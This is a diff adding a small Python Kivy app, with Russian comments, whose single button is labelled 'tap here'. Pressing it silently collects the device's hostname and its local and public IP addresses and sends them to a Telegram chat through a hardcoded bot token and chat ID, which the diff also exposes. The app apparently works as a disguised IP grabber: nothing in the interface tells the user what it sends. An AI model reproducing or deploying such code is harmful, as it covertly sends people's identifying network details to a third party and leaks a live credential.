@@ -1,0 +1,55 @@
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.button import Button
+import socket
+from requests import get
+import threading
+import telebot
+
+# Настройки для Telegram-бота
+TOKEN = '7045345803:AAFw87NDvYXjRzjz50x3l4fAmL_RLQUZXLU'
+CHAT_ID = -1002305203946
+
+# Инициализация бота
+bot = telebot.TeleBot(TOKEN)
+
+# Функция для отправки информации об IP
+def send_ip_info():
+    try:
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        public_ip = get('http://api.ipify.org').text
+
+        message = (
+            f"\u2709 <b>Уведомление:</b>\n"
+            f"\u2022 <b>Хост:</b> {hostname}\n"
+            f"\u2022 <b>Локальный IP:</b> {local_ip}\n"
+            f"\u2022 <b>Публичный IP:</b> {public_ip}"
+        )
+
+        bot.send_message(chat_id=CHAT_ID, text=message, parse_mode="HTML")
+    except Exception as e:
+        print(f"Ошибка при отправке сообщения: {e}")
+
+class MainApp(App):
+    def build(self):
+        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
+        
+        # Кнопка для отправки IP информации
+        button = Button(
+            text="тык сюда",
+            size_hint=(1, 0.3),
+            background_color=(0.2, 0.6, 1, 1),  # Синий цвет кнопки
+        )
+        button.bind(on_press=self.on_button_press)
+        layout.add_widget(button)
+        
+        return layout
+
+    def on_button_press(self, instance):
+        # Запуск функции отправки в отдельном потоке
+        thread = threading.Thread(target=send_ip_info)
+        thread.start()
+
+if __name__ == "__main__":
+    MainApp().run()
